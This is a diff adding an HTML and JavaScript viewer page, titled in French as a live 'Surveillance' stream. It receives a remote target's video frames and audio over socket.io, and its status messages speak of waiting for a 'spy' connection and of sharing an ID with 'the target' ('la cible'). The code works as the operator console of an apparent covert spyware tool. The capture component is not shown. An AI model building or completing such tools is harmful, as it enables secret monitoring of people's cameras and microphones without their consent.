@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 STREAM LIVE - Surveillance</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#000;color:#0f0;font-family:monospace;height:100vh;overflow:hidden}
+        #video{width:100vw;height:100vh;object-fit:cover}
+        #controls{position:absolute;top:20px;left:20px;background:rgba(0,0,0,0.8);padding:20px;border-radius:10px}
+        #streamId{font-family:monospace;background:#111;color:#0f0;padding:10px;border-radius:5px;font-size:18px}
+        button{padding:10px 20px;background:#0f6;color:#000;border:0;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold}
+        #status{color:#ff0;font-size:14px}
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline muted></video>
+    <div id="controls">
+        <div>ID STREAM: <div id="streamId">ATTENTE...</div></div>
+        <button onclick="toggleAudio()">🔊 Audio ON/OFF</button>
+        <button onclick="toggleFull()">⛶ Plein écran</button>
+        <div id="status">🔴 En attente de connexion espion...</div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const video = document.getElementById('video');
+        const streamIdDiv = document.getElementById('streamId');
+        const status = document.getElementById('status');
+        let audioEnabled = false;
+        let streamId = 'DEMO-' + Math.random().toString(36).substr(2, 8);
+        
+        streamIdDiv.textContent = streamId;
+        socket.emit('join-stream', streamId);
+        status.textContent = `🔴 Attente stream ${streamId}... Partagez cet ID avec la cible`;
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        socket.on('video-frame', (base64Frame) => {
+            const img = new Image();
+            img.onload = () => {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                video.srcObject = canvas.captureStream(30);
+                status.textContent = `✅ LIVE VIDEO ${streamId} (${new Date().toLocaleTimeString()})`;
+            };
+            img.src = base64Frame;
+        });
+
+        socket.on('audio-chunk', (base64Audio) => {
+            if (audioEnabled) {
+                const uint8 = Uint8Array.from(atob(base64Audio), c => c.charCodeAt(0));
+                audioCtx.decodeAudioData(uint8.buffer).then(buffer => {
+                    const source = audioCtx.createBufferSource();
+                    source.buffer = buffer;
+                    source.connect(audioCtx.destination);
+                    source.start();
+                });
+            }
+        });
+
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            status.textContent = audioEnabled ? '🔊 AUDIO ACTIVÉ' : '🔇 Audio désactivé';
+        }
+
+        function toggleFull() {
+            if (!document.fullscreenElement) video.requestFullscreen();
+            else document.exitFullscreen();
+        }
+    </script>
+</body>
+</html>
